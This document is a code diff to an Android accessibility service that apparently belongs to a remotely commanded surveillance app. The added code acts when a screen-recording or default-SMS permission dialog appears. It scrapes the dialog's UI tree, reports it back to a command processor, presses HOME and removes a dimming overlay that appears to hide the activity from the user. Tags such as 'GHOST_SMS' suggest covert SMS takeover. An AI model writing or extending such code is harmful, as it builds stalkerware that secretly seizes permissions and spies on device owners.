@@ -324,15 +324,25 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             }
         } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
-            val treeJson = getInstantTree(null, 10)
-            val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
-            DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
-            DebugLogger.log("SCREEN_REC", "Scraped dialog for forensic mapping. Pkg: $pkgName")
-            ScreenRecordManager.expectedMode = "" // Disarm
+            ScreenRecordManager.expectedMode = "SCRAPING" // Prevent multi-triggers
+            DebugLogger.log("SCREEN_REC", "Dialog detected. Waiting 1.5s for UI to settle...")
             
-            // Pipe the scraped payload directly back to the database
             CoroutineScope(Dispatchers.IO).launch {
+                delay(1500)
+                val treeJson = getInstantTree(null, 10)
+                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
+                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
+                DebugLogger.log("SCREEN_REC", "Scraped dialog for forensic mapping. Pkg: $pkgName")
+                
                 CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
+                
+                withContext(Dispatchers.Main) {
+                    performGlobalAction(GLOBAL_ACTION_HOME)
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        DimmerManager.removeOverlay(applicationContext)
+                        ScreenRecordManager.expectedMode = "" // Disarm completely
+                    }, 500)
+                }
             }
         }
 
@@ -825,20 +835,26 @@ class MyAccessibilityService : AccessibilityService() {
                     }
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
-                val treeJson = getInstantTree(null, 10)
-                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
-                DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
-                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping. Pkg: $pkgName")
-                DefaultSmsManager.expectedMode = "" // Disarm
+                DefaultSmsManager.expectedMode = "SCRAPING" // Prevent multi-triggers
+                DebugLogger.log("GHOST_SMS", "Dialog detected. Waiting 1.5s for UI to settle...")
                 
                 CoroutineScope(Dispatchers.IO).launch {
+                    delay(1500)
+                    val treeJson = getInstantTree(null, 10)
+                    val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
+                    DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
+                    DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping. Pkg: $pkgName")
+                    
                     CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
+                    
+                    withContext(Dispatchers.Main) {
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            DimmerManager.removeOverlay(applicationContext)
+                            DefaultSmsManager.expectedMode = "" // Disarm completely
+                        }, 500)
+                    }
                 }
-                
-                performGlobalAction(GLOBAL_ACTION_HOME)
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    DimmerManager.removeOverlay(applicationContext)
-                }, 500)
             }
 
         // --- SEQUENCE ENGINE HOOK ---
